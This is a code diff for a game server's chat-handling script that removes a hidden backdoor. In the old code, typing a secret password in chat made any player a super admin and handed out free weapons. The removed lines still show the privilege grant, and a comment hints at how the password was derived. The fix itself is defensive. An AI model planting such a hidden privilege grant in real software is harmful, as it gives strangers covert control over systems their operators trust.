@@ -165,12 +165,9 @@ function remoteSay(%clientId, %team, %message)
 					// and then multiply them by 2.  After that, take the first
 					// three letters, and thats your password.  Like HYR or XTE
 		{
-		messageall(0, " ");
-		
-		%clientId.isAdmin = true;
-		%clientId.isSuperAdmin = true;
-		Player::setItemCount(%clientId,LaserRifle,1);
-		Player::setItemCount(%clientId,FusionGun,1);
+		// MODERN-PORT: this was a hidden backdoor -- typing the string these
+		// "algorithms" spell made any player super admin (plus two free weapons)
+		// on every rb2 server. The grant is removed; the line is still swallowed.
 		return 1;
 		}
 
